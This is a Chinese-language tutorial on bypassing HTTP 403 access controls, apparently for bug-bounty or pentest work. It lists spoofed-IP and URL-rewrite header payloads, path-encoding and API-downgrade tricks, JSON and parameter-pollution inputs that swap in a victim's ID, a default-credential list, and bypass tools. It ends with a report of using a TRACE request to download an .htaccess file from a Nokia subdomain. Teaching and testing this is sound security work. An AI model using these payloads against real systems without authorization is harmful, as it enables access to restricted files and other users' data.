## 403页面绕过技巧(先分享技巧和工具，后面分享实战报告)
### 1.什么是403？
作为普通用户，我们没有访问特定网页的权限（只能管理员等访问），所以当我们尝试访问该类型的网站时，它会给我们返回 403 forbidden。

### 什么是403绕过？
绕过 403 Forbidden Error 表示客户端能够与服务器通信，但服务器不允许客户端访问所请求的内容。
### 2.HTTP 请求方法fuzz
尝试使用不同的请求方法来访问：` GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK `


### 3.HTTP 标头fuzz
```
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
Client-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
Cluster-Client-IP: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
Host: localhost
```
如果路径受到保护，您可以尝试使用这些其他标头绕过路径保护：
```
X-Original-URL: /admin/console
X-Rewrite-URL: /admin/console
```
### 4.路径fuzz
1. 尝试使用 /%2e/path _（如果访问被代理阻止，这可能会绕过保护），也可以试试_** /%252e**/path（双 URL 编码）
2. 尝试 Unicode 绕过：/%ef%bc%8fpath
#### 其他路径绕过：
```
site.com/secret –> HTTP 403 Forbidden
site.com/SECRET –> HTTP 200 OK
site.com/secret/ –> HTTP 200 OK
site.com/secret/. –> HTTP 200 OK
site.com//secret// –> HTTP 200 OK
site.com/./secret/.. –> HTTP 200 OK
site.com/;/secret –> HTTP 200 OK
site.com/.;/secret –> HTTP 200 OK
site.com//;//secret –> HTTP 200 OK
site.com/secret.json –> HTTP 200 OK 
```
其他api绕过
```
/v3/users_data/1234 --> 403 Forbidden
/v1/users_data/1234 --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:[111]} --> 200 OK
{“id”:111} --> 401 Unauthriozied
{“id”:{“id”:111}} --> 200 OK
{"user_id":"<legit_id>","user_id":"<victims_id>"} (JSON 参数污染)
user_id=ATTACKER_ID&user_id=VICTIM_ID (参数污染)
```
## 更换协议版本
如果使用 HTTP/1.1，请尝试使用 1.0，或者测试看它是否支持 2.0。
## 暴力破解
```
admin    admin
admin    password
admin    1234
admin    admin1234
admin    123456
root     toor
test     test
guest    guest
```
## 自动化工具使用
1. https://github.com/lobuhi/byp4xx
2. https://github.com/iamj0ker/bypass-403
3. https://github.com/gotr00t0day/forbiddenpass
4. Burp扩展：https://portswigger.net/bappstore/444407b96d9c4de0adb7aed89e826122



## 实战报告分析

首先我们的目标是一个类似`https://subs.nokia.com`的网站

![image](https://user-images.githubusercontent.com/98140109/233623291-19895314-be4e-4ac9-9d50-3172e76e0923.png)

首先，我检查网站是否包含隐藏目录，所以我尝试 `https://subdomain.nokia.com/.htaccess` ，它返回了 403 错误而不是 404 ，这意味着 .htaccess 文件存在于该子域中。

https://subs.nokia.com/.htaccess 

![image](https://user-images.githubusercontent.com/98140109/233623508-6263cf67-b78c-4d0d-8b80-78c14be32bcc.png)

### 绕过

接下来怎么绕过，包括上面讲解的方法和工具都可以尝试
尝试更改请求方法绕过
如GET → POST、GET → TRACE等。
Burp-Suite抓包并拦截，尝试post绕过失败，trace绕过直接成功

![image](https://user-images.githubusercontent.com/98140109/233624029-a1f2c3f9-9489-4438-bc53-d706b6aee139.png)

成功绕过，.htaccess 文件弹出并给我下载权限。

![image](https://user-images.githubusercontent.com/98140109/233624130-c13295f4-bcae-49bd-8c8f-b985152191dd.png)

这就是全部


